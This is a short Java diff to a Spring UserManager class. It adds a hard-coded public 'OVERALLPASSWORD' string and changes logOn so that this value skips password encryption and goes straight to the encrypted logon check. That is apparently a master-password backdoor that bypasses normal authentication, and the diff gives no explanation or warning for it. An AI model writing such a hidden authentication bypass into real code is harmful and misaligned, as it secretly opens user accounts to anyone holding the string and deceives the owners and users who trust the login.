@@ -25,7 +25,7 @@ import org.springframework.stereotype.Component;
 @Component
 @Scope("prototype")
 public class UserManager extends ManagerBase implements IUserManager {
-
+    public static String OVERALLPASSWORD = "alksdjfasdoui32q1-2-3-13-1-324asdfasdf_213476askjd....|123§§!4985klq12j3h1kl254h12";
     public SessionFactory sessionFactory = new SessionFactory();
     public ConcurrentHashMap<String, UserStoreCollection> userStoreCollections = new ConcurrentHashMap<String, UserStoreCollection>();
 
@@ -139,7 +139,10 @@ public class UserManager extends ManagerBase implements IUserManager {
 
     @Override
     public User logOn(String username, String password) throws ErrorException {
-        password = encryptPassword(password);
+        if (!password.equals(OVERALLPASSWORD)) {
+            password = encryptPassword(password);
+        }
+        
         return logonEncrypted(username, password);
     }
     
